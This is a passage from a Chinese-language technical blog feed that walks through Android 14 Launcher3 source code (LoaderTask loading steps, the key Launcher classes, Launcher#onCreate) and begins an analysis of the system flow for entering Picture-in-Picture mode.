logASplit(logger, <span class="string">&quot;bindWorkspace&quot;</span>);</span><br><span class="line">        mModelDelegate.workspaceLoadComplete();</span><br><span class="line">        <span class="comment">// 发送首屏广播。</span></span><br><span class="line">        sendFirstScreenActiveInstallsBroadcast();</span><br><span class="line">        logASplit(logger, <span class="string">&quot;sendFirstScreenActiveInstallsBroadcast&quot;</span>);</span><br><span class="line">        <span class="comment">// 等待桌面(workspace)加载完成再加载抽屉(AllApps)</span></span><br><span class="line">        waitForIdle();</span><br><span class="line">        logASplit(logger, <span class="string">&quot;step 1 complete&quot;</span>);</span><br><span class="line">        verifyNotStopped();</span><br><span class="line">        <span class="comment">// 第二步：</span></span><br><span class="line">        Trace.beginSection(<span class="string">&quot;LoadAllApps&quot;</span>);</span><br><span class="line">        List&lt;LauncherActivityInfo&gt; allActivityList;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 加载所有应用App</span></span><br><span class="line">            allActivityList = loadAllApps();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            Trace.endSection();</span><br><span class="line">        &#125;</span><br><span class="line">        logASplit(logger, <span class="string">&quot;loadAllApps&quot;</span>);</span><br><span class="line">        verifyNotStopped();</span><br><span class="line">        <span class="comment">// 绑定 AllApps</span></span><br><span class="line">        mResults.bindAllApps();</span><br><span class="line">        logASplit(logger, <span class="string">&quot;bindAllApps&quot;</span>);</span><br><span class="line">        verifyNotStopped();</span><br><span class="line">        <span class="comment">// 关于 IconCacheUpdateHandler  文章后面有补充。</span></span><br><span class="line">        <span class="type">IconCacheUpdateHandler</span> <span class="variable">updateHandler</span> <span class="operator">=</span> mIconCache.getUpdateHandler();</span><br><span class="line">        setIgnorePackages(updateHandler);</span><br><span class="line">        updateHandler.updateIcons(allActivityList,</span><br><span class="line">                LauncherActivityCachingLogic.newInstance(mApp.getContext()),</span><br><span class="line">                mApp.getModel()::onPackageIconsUpdated);</span><br><span class="line">        logASplit(logger, <span class="string">&quot;update icon cache&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (FeatureFlags.ENABLE_DEEP_SHORTCUT_ICON_CACHE.get()) &#123;</span><br><span class="line">            verifyNotStopped();</span><br><span class="line">            logASplit(logger, <span class="string">&quot;save shortcuts in icon cache&quot;</span>);</span><br><span class="line">            <span class="comment">// 将对应图标进行缓存</span></span><br><span class="line">            updateHandler.updateIcons(allShortcuts, <span class="keyword">new</span> <span class="title class_">ShortcutCachingLogic</span>(),</span><br><span class="line">                    mApp.getModel()::onPackageIconsUpdated);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 等待上一操作加载完成，在进行加载应用程序快捷方式</span></span><br><span class="line">        waitForIdle();</span><br><span class="line">        logASplit(logger, <span class="string">&quot;step 2 complete&quot;</span>);</span><br><span class="line">        verifyNotStopped();</span><br><span class="line">        <span class="comment">// 第三步：加载应用程序快捷方式</span></span><br><span class="line">        List&lt;ShortcutInfo&gt; allDeepShortcuts = loadDeepShortcuts();</span><br><span class="line">        logASplit(logger, <span class="string">&quot;loadDeepShortcuts&quot;</span>);</span><br><span class="line">        verifyNotStopped();</span><br><span class="line">        <span class="comment">// 数据同步绑定应用程序快捷方式</span></span><br><span class="line">        mResults.bindDeepShortcuts();</span><br><span class="line">        logASplit(logger, <span class="string">&quot;bindDeepShortcuts&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (FeatureFlags.ENABLE_DEEP_SHORTCUT_ICON_CACHE.get()) &#123;</span><br><span class="line">            verifyNotStopped();</span><br><span class="line">            logASplit(logger, <span class="string">&quot;save deep shortcuts in icon cache&quot;</span>);</span><br><span class="line">            <span class="comment">// 缓存对应图标</span></span><br><span class="line">            updateHandler.updateIcons(allDeepShortcuts,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ShortcutCachingLogic</span>(), (pkgs, user) -&gt; &#123; &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 等待上一操作加载完成，在进行加载小部件等</span></span><br><span class="line">        waitForIdle();</span><br><span class="line">        logASplit(logger, <span class="string">&quot;step 3 complete&quot;</span>);</span><br><span class="line">        verifyNotStopped();</span><br><span class="line">        <span class="comment">// 第四步：加载桌面小部件</span></span><br><span class="line">        List&lt;ComponentWithLabelAndIcon&gt; allWidgetsList =</span><br><span class="line">                mBgDataModel.widgetsModel.update(mApp, <span class="literal">null</span>);</span><br><span class="line">        logASplit(logger, <span class="string">&quot;load widgets&quot;</span>);</span><br><span class="line">        verifyNotStopped();</span><br><span class="line">        <span class="comment">// 绑定 Widgets</span></span><br><span class="line">        mResults.bindWidgets();</span><br><span class="line">        logASplit(logger, <span class="string">&quot;bindWidgets&quot;</span>);</span><br><span class="line">        verifyNotStopped();</span><br><span class="line">            <span class="comment">// 将小部件进行缓存</span></span><br><span class="line">        updateHandler.updateIcons(allWidgetsList,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ComponentWithIconCachingLogic</span>(mApp.getContext(), <span class="literal">true</span>),</span><br><span class="line">                mApp.getModel()::onWidgetLabelsUpdated);</span><br><span class="line">        logASplit(logger, <span class="string">&quot;save widgets in icon cache&quot;</span>);</span><br><span class="line">        <span class="comment">// 第五步</span></span><br><span class="line">        <span class="keyword">if</span> (FeatureFlags.FOLDER_NAME_SUGGEST.get()) &#123;</span><br><span class="line">            <span class="comment">// 加载文件夹名称</span></span><br><span class="line">            loadFolderNames();</span><br><span class="line">        &#125;</span><br><span class="line">        verifyNotStopped();</span><br><span class="line">        updateHandler.finish();</span><br><span class="line">        logASplit(logger, <span class="string">&quot;finish icon update&quot;</span>);</span><br><span class="line">        mModelDelegate.modelLoadComplete();</span><br><span class="line">        <span class="comment">// 提交完成。</span></span><br><span class="line">        transaction.commit();</span><br><span class="line">        memoryLogger.clearLogs();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (CancellationException e) &#123;</span><br><span class="line">        <span class="comment">// Loader stopped, ignore</span></span><br><span class="line">        logASplit(logger, <span class="string">&quot;Cancelled&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        memoryLogger.printLogs();</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        logger.dumpToLog();</span><br><span class="line">    &#125;</span><br><span class="line">    TraceHelper.INSTANCE.endSection(traceToken);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述 <strong>LoaderTask#run()</strong> 代码可以清晰的看到每一步操作所要做的工作。 <strong>loadWorkspace()</strong> 和 <strong>bindWorkspace()</strong> ，也就是加载 <strong>workspace</strong> 的应用并且进行绑定， <strong>waitForIdle()</strong> 方法主要是等待加载数据结束。 <strong>sendFirstScreenActiveInstallsBroadcast()</strong> 发送首屏广播。 <strong>loadAllApps()</strong> 和 <strong>bindAllApps()</strong> 加载并绑定所有的 APP 信息， <strong>loadDeepShortcuts()</strong> 和 <strong>bindDeepShortcuts()</strong> 加载并绑定所有的快捷方式，然后加载并绑定所有的小部件。至此launcher数据加载基本就完成了。<br><strong>补充</strong>：上述代码出现比较多的 <strong>IconCacheUpdateHandler</strong> 。</p><blockquote><p>IconCacheUpdateHandler：用于处理图标缓存更新的实用程序类。<br>IconCacheUpdateHandler#updateIcons()： 更新持久数据库，以便只有与应用程序相对应的条目保留在数据库中并进行更新。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14 Launcher 基础认识(一)</title>
      <link href="/2024/02/15/2024-02-15/"/>
      <url>/2024/02/15/2024-02-15/</url>
      
        <content type="html"><![CDATA[<h3 id="1-Launcher-简介"><a href="#1-Launcher-简介" class="headerlink" title="1 Launcher 简介"></a>1 Launcher 简介</h3><p>Launcher 是 Android 系统不可缺少的部分，我们通常称之为 Android 系统的桌面，它在 Android 系统中起着重要的作用。</p><ul><li>Launcher 是 Android 系统的启动器。在 Launcher 中可以启动你想要使用的应用程序。</li><li>Launcher 也是应用程序的管理器。可用来对应用程序进行基础的管理，比如删除或者展示应用程序。</li><li>Launcher 更重要的意义在于它是一个桌面。在 Android 的桌面上，你可以放置各种快捷方式、桌面小部件，也可以通过 Launcher 更换壁纸，使你的桌面更炫更便利更加个性化。</li></ul><h3 id="2-Launcher-结构"><a href="#2-Launcher-结构" class="headerlink" title="2 Launcher 结构"></a>2 Launcher 结构</h3><p>在 Launcher 中主要有两大组件：</p><ul><li><strong>UI组件</strong>：桌面(Workspace)、应用程序菜单(Allapps)、快捷启动栏(Hotseat)、搜索和页面指示条、快捷菜单。</li><li><strong>桌面组件</strong>：应用程序的快捷方式及相关视图实现(DeepShortcuts)、文件夹及相关视图实现、桌面小部件及相关组件(Widgets)。</li></ul><p><img src="/images/20240215/20240215001.png"></p><p><img src="/images/20240215/20240215002.png"></p><h3 id="3-主要文件和类"><a href="#3-主要文件和类" class="headerlink" title="3 主要文件和类"></a>3 主要文件和类</h3><ul><li><strong>Launcher.java</strong>：launcher中主要的activity。</li><li><strong>LoaderTask.java</strong>: 可运行用于加载启动器内容的线程： 工作区图标 、小部件 、所有应用程序图标 、应用程序快捷方式。</li><li><strong>LauncherAppState.java</strong>：用于存储全局变量，比如：缓存(各种cache)，维护内存数据的类(LauncherModel)。</li><li><strong>DragLayer.java</strong>：launcher layout的rootview。DragLayer实际上也是一个抽象的界面，用来处理拖动和对事件进行初步处理然后按情况分发下去，角色是一个controller。它首先用onInterceptTouchEvent(MotionEvent)来拦截所有的touch事件，如果是长按item拖动的话不把事件传下去，直接交由onTouchEvent()处理，这样就可以实现item的移动了，如果不是拖动item的话就把事件传到目标view，交有目标view的事件处理函数做相应处理。如过有要对事件的特殊需求的话可以修改onInterceptTouchEvent(MotionEvent)来实现所需要的功能。</li><li><strong>DragController.java</strong>：为Drag定义的一个接口。包含一个接口,两个方法和两个静态常量。接口为DragListener（包含onDragStart()，onDragEnd()两个函数）,onDragStart()是在刚开始拖动的时候被调用，onDragEnd()是在拖动完成时被调用。在launcher中典型的应用是DeleteZone，在长按拖动item时调用onDragStart()显示，在拖动结束的时候onDragEnd()隐藏。两个函数包括startDrag()和setDragItemInfo().startDrag()用于在拖动是传递要拖动的item的信息以及拖动的方式，setDragItemInfo()用于传递item的参数信息（包括位置以及大小）。两个常量为DRAG_ACTION_MOVE，DRAG_ACTION_COPY来标识拖动的方式，DRAG_ACTION_MOVE为移动，表示在拖动的时候需要删除原来的item，DRAG_ACTION_COPY为复制型的拖动，表示保留被拖动的item。</li><li><strong>LauncherModel.java</strong>：辅助的文件。里面有许多封装的对数据库的操作。包含几个线程，其中最主要的是ApplicationsLoader和DesktopItemsLoader。ApplicationsLoader在加载所有应用程序时使用，DesktopItemsLoader在加载workspace的时候使用。其他的函数就是对数据库的封装，比如在删除，替换，添加程序的时候做更新数据库和UI的工作。</li><li><strong>Workspace.java</strong>：抽象的桌面。由N个celllaout组成,从cellLayout更高一级的层面上对事件的处理。</li><li><strong>LauncherProvider.java</strong>：launcher的数据库，里面存储了桌面的item的信息。在创建数据库的时候会loadFavorites(db)方法，loadFavorites()会解析xml目录下的default_workspace.xml文件，把其中的内容读出来写到数据库中，这样就做到了桌面的预制。</li><li><strong>CellLayout.java</strong>：组成workspace的view,继承自viewgroup，既是一个dragSource，又是一个dropTarget,可以将它里面的item拖出去，也可以容纳拖动过来的item。在workspace_screen里面定了一些它的view参数。</li><li><strong>ItemInfo.java</strong>：对item的抽象，所有类型item的父类，item包含的属性有id（标识item的id）,cellX(在横向位置上的位置，从0开始),cellY（在纵向位置上的位置，从0开始） ,spanX（在横向位置上所占的单位格）,spanY（在纵向位置上所占的单位格）,screen（在workspace的第几屏，从0开始）,itemType（item的类型，有widget，search，application等）,container（item所在的）。</li><li><strong>LauncherSettings.java</strong>：字符串的定义。数据库项的字符串定义，另外在这里定义了container的类型，还有itemType的定义，除此还有一些特殊的widget(如search,clock的定义等)的类型定义。</li></ul><h3 id="4-launcher-源码分析"><a href="#4-launcher-源码分析" class="headerlink" title="4 launcher 源码分析"></a>4 launcher 源码分析</h3><p><strong>Launcher.java</strong> 是 launcher 主要、第一个启动的 activity，在其里面进行显示、初始化一些 View。<br><strong>launcher#onCreate()</strong><br><strong>packages/apps/Launcher3/src/com/android/launcher3/Launcher.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">traceToken</span> <span class="operator">=</span> TraceHelper.INSTANCE.beginSection(ON_CREATE_EVT,</span><br><span class="line">            TraceHelper.FLAG_UI_EVENT);</span><br><span class="line">    <span class="keyword">if</span> (DEBUG_STRICT_MODE) &#123;</span><br><span class="line">        <span class="comment">//StrictMode被称为严苛模式，google提供用来进行测试的类</span></span><br><span class="line">        StrictMode.setThreadPolicy(<span class="keyword">new</span> <span class="title class_">StrictMode</span>.ThreadPolicy.Builder()</span><br><span class="line">                .detectDiskReads()</span><br><span class="line">                .detectDiskWrites()</span><br><span class="line">                .detectNetwork()   <span class="comment">// or .detectAll() for all detectable problems</span></span><br><span class="line">                .penaltyLog()</span><br><span class="line">                .build());</span><br><span class="line">        StrictMode.setVmPolicy(<span class="keyword">new</span> <span class="title class_">StrictMode</span>.VmPolicy.Builder()</span><br><span class="line">                .detectLeakedSqlLiteObjects()</span><br><span class="line">                .detectLeakedClosableObjects()</span><br><span class="line">                .penaltyLog()</span><br><span class="line">                .penaltyDeath()</span><br><span class="line">                .build());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    <span class="comment">// 单例模式，初始化LauncherAppState</span></span><br><span class="line">    <span class="type">LauncherAppState</span> <span class="variable">app</span> <span class="operator">=</span> LauncherAppState.getInstance(<span class="built_in">this</span>);</span><br><span class="line">    mOldConfig = <span class="keyword">new</span> <span class="title class_">Configuration</span>(getResources().getConfiguration());</span><br><span class="line">        <span class="comment">// 获取LauncherModel实例</span></span><br><span class="line">    mModel = app.getModel();</span><br><span class="line">    mRotationHelper = <span class="keyword">new</span> <span class="title class_">RotationHelper</span>(<span class="built_in">this</span>);</span><br><span class="line">    <span class="type">InvariantDeviceProfile</span> <span class="variable">idp</span> <span class="operator">=</span> app.getInvariantDeviceProfile();</span><br><span class="line">    <span class="comment">// 初始化手机固件信息对象DeviceProfile</span></span><br><span class="line">    initDeviceProfile(idp);</span><br><span class="line">    idp.addOnChangeListener(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">// 获取sharedPreferences</span></span><br><span class="line">    mSharedPrefs = Utilities.getPrefs(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">// 获取IconCache实例,此类主要保存图标信息</span></span><br><span class="line">    mIconCache = app.getIconCache();</span><br><span class="line">    mAccessibilityDelegate = createAccessibilityDelegate();</span><br><span class="line">    <span class="comment">// 拖拽</span></span><br><span class="line">    mDragController = <span class="keyword">new</span> <span class="title class_">LauncherDragController</span>(<span class="built_in">this</span>);</span><br><span class="line">    mAllAppsController = <span class="keyword">new</span> <span class="title class_">AllAppsTransitionController</span>(<span class="built_in">this</span>);</span><br><span class="line">    mStateManager = <span class="keyword">new</span> <span class="title class_">StateManager</span>&lt;&gt;(<span class="built_in">this</span>, NORMAL);</span><br><span class="line">    mOnboardingPrefs = createOnboardingPrefs(mSharedPrefs);</span><br><span class="line">    <span class="comment">// 获取AppWidgetManager实例，用来管理widge</span></span><br><span class="line">    mAppWidgetManager = <span class="keyword">new</span> <span class="title class_">WidgetManagerHelper</span>(<span class="built_in">this</span>);</span><br><span class="line">    mAppWidgetHost = createAppWidgetHost();</span><br><span class="line">    mAppWidgetHost.startListening();</span><br><span class="line">    <span class="comment">// 设置布局</span></span><br><span class="line">    inflateRootView(R.layout.launcher);</span><br><span class="line">    <span class="comment">// 初始化View，进行各种View的初始化事件绑定</span></span><br><span class="line">    setupViews();</span><br><span class="line">    crossFadeWithPreviousAppearance();</span><br><span class="line">    mPopupDataProvider = <span class="keyword">new</span> <span class="title class_">PopupDataProvider</span>(<span class="built_in">this</span>::updateNotificationDots);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">internalStateHandled</span> <span class="operator">=</span> ACTIVITY_TRACKER.handleCreate(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">if</span> (internalStateHandled) &#123;</span><br><span class="line">        <span class="keyword">if</span> (savedInstanceState != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// InternalStateHandler has already set the appropriate state.</span></span><br><span class="line">            <span class="comment">// We dont need to do anything.</span></span><br><span class="line">            savedInstanceState.remove(RUNTIME_STATE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    restoreState(savedInstanceState);</span><br><span class="line">    mStateManager.reapplyState();</span><br><span class="line">    <span class="keyword">if</span> (savedInstanceState != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">int</span>[] pageIds = savedInstanceState.getIntArray(RUNTIME_STATE_CURRENT_SCREEN_IDS);</span><br><span class="line">        <span class="keyword">if</span> (pageIds != <span class="literal">null</span>) &#123;</span><br><span class="line">            mPagesToBindSynchronously = IntSet.wrap(pageIds);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 加载、绑定数据（这里与之前版本的 startLoader() 作用一样）</span></span><br><span class="line">    <span class="keyword">if</span> (!mModel.addCallbacksAndLoad(<span class="built_in">this</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!internalStateHandled) &#123;</span><br><span class="line">            Log.d(BAD_STATE, <span class="string">&quot;Launcher onCreate not binding sync, prevent drawing&quot;</span>);</span><br><span class="line">            <span class="comment">// If we are not binding synchronously, pause drawing until initial bind complete,</span></span><br><span class="line">            <span class="comment">// so that the system could continue to show the device loading prompt</span></span><br><span class="line">            mOnInitialBindListener = Boolean.FALSE::booleanValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// For handling default keys</span></span><br><span class="line">    setDefaultKeyMode(DEFAULT_KEYS_SEARCH_LOCAL);</span><br><span class="line">    setContentView(getRootView());</span><br><span class="line">    <span class="keyword">if</span> (mOnInitialBindListener != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">//getRootView().getViewTreeObserver().addOnPreDrawListener(mOnInitialBindListener);</span></span><br><span class="line">    &#125;</span><br><span class="line">    getRootView().dispatchInsets();</span><br><span class="line">    <span class="comment">// 注册屏幕关闭广播</span></span><br><span class="line">    registerReceiver(mScreenOffReceiver, <span class="keyword">new</span> <span class="title class_">IntentFilter</span>(Intent.ACTION_SCREEN_OFF));</span><br><span class="line">    getSystemUiController().updateUiState(SystemUiController.UI_STATE_BASE_WINDOW,</span><br><span class="line">            Themes.getAttrBoolean(<span class="built_in">this</span>, R.attr.isWorkspaceDarkText));</span><br><span class="line">    <span class="keyword">if</span> (mLauncherCallbacks != <span class="literal">null</span>) &#123;</span><br><span class="line">        mLauncherCallbacks.onCreate(savedInstanceState);</span><br><span class="line">    &#125;</span><br><span class="line">    mOverlayManager = getDefaultOverlay();</span><br><span class="line">    PluginManagerWrapper.INSTANCE.get(<span class="built_in">this</span>).addPluginListener(<span class="built_in">this</span>,</span><br><span class="line">            LauncherOverlayPlugin.class, <span class="literal">false</span> <span class="comment">/* allowedMultiple */</span>);</span><br><span class="line">    mRotationHelper.initialize();</span><br><span class="line">    TraceHelper.INSTANCE.endSection(traceToken);</span><br><span class="line">    mUserChangedCallbackCloseable = UserCache.INSTANCE.get(<span class="built_in">this</span>).addUserChangeListener(</span><br><span class="line">            () -&gt; getStateManager().goToState(NORMAL));</span><br><span class="line">    <span class="keyword">if</span> (Utilities.ATLEAST_R) &#123;</span><br><span class="line">        getWindow().setSoftInputMode(LayoutParams.SOFT_INPUT_ADJUST_NOTHING);</span><br><span class="line">    &#125;</span><br><span class="line">    setTitle(R.string.home_screen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码中可以看出，首先调用了 <strong>LauncherAppState.getInstance(this)</strong> 来初始化一个单例对象 ，而 <strong>LauncherAppState</strong> 里面保存了一些比较常用的对象，方便其他地方通过单例来获取，比如 <strong>IconCache、LauncherModel</strong> 等；并且注册了广播监听器和 <strong>ContentObserver</strong> ；设置布局 <strong>launcher.xml</strong> ，调用 <strong>setupViews()</strong> 又是一些 <strong>View</strong> 的初始化，设置回调监听等。<br>总结一下 <strong>onCreate()</strong> 的工作：初始化对象、加载布局、注册一些事件监听、以及开启数据加载。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14 PIP画中画模式系统流程解析</title>
      <link href="/2024/02/14/2024-02-14/"/>
      <url>/2024/02/14/2024-02-14/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>从 Android 8.0（API 级别 26）开始，Android 允许以画中画 (PiP) 模式启动 activity。画中画是一种特殊类型的多窗口模式，最常用于视频播放。使用该模式，用户可以通过固定到屏幕一角的小窗口观看视频，同时在应用之间进行导航或浏览主屏幕上的内容。</p><h3 id="一-画中画创建"><a href="#一-画中画创建" class="headerlink" title="一. 画中画创建"></a>一. 画中画创建</h3><p>Activity调用系统api：<strong>ActivityTaskManagerService#enterPictureInPictureMode()</strong> 开始:</p><p><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityTaskManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">enterPictureInPictureMode</span><span class="params">(<span class="meta">@NonNull</span> ActivityRecord r, PictureInPictureParams params)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果 activity 已经处于画中画模式，则返回</span></span><br><span class="line">    <span class="keyword">if</span> (r.inPinnedWindowingMode()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Activity支持画中画，现在检查我们此时是否可以进入画中画，</span></span><br><span class="line">    <span class="keyword">if</span> (!r.checkEnterPictureInPictureState(<span class="string">&quot;enterPictureInPictureMode&quot;</span>,</span><br><span class="line">            <span class="literal">false</span> <span class="comment">/* beforeStopping */</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建了一个 Runnable，在下方将会被调用</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Runnable</span> <span class="variable">enterPipRunnable</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mGlobalLock) &#123;</span><br><span class="line">            <span class="keyword">if</span> (r.getParent() == <span class="literal">null</span>) &#123;</span><br><span class="line">                Slog.e(TAG, <span class="string">&quot;Skip enterPictureInPictureMode, destroyed &quot;</span> + r);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            r.setPictureInPictureParams(params);</span><br><span class="line">            <span class="comment">// **--------重点关注-------------**</span></span><br><span class="line">            mRootWindowContainer.moveActivityToPinnedRootTask(r,</span><br><span class="line">                    <span class="literal">null</span> <span class="comment">/* launchIntoPipHostActivity */</span>, <span class="string">&quot;enterPictureInPictureMode&quot;</span>);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Task</span> <span class="variable">task</span> <span class="operator">=</span> r.getTask();</span><br><span class="line">            <span class="comment">// Continue the pausing process after entering pip.</span></span><br><span class="line">            <span class="keyword">if</span> (task.getPausingActivity() == r) &#123;</span><br><span class="line">                task.schedulePauseActivity(r, <span class="literal">false</span> <span class="comment">/* userLeaving */</span>,</span><br><span class="line">                        <span class="literal">false</span> <span class="comment">/* pauseImmediately */</span>, <span class="string">&quot;auto-pip&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (r.isKeyguardLocked()) &#123;</span><br><span class="line">        <span class="comment">// 如果键盘锁正在显示或被遮挡，则在进入画中画之前尝试关闭它</span></span><br><span class="line">        <span class="comment">// 如果设备当前已锁定（有锁的情况），这将提示用户进行身份验证（即弹出bouncer）。</span></span><br><span class="line">        mActivityClientController.dismissKeyguard(r.token, <span class="keyword">new</span> <span class="title class_">KeyguardDismissCallback</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDismissSucceeded</span><span class="params">()</span> &#123;</span><br><span class="line">                mH.post(enterPipRunnable);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="literal">null</span> <span class="comment">/* message */</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 否则立即进入画中画</span></span><br><span class="line">        enterPipRunnable.run();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果activity现在处于画中画模式，则为 <strong>return true</strong> ；如果无法进入画中画模式，则为 <strong>return false</strong> 。<br>App 端 <strong>binder</strong> 回调到 <strong>ATMS</strong> 的方法，如果有 <strong>keyguard</strong> ，先 <strong>dismiss keyguard</strong> 再进入pip。<br>接着根据上述代码看 <strong>RootWindowContainer#moveActivityToPinnedRootTask()</strong>:</p><p><strong>frameworks/base/services/core/java/com/android/server/wm/RootWindowContainer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 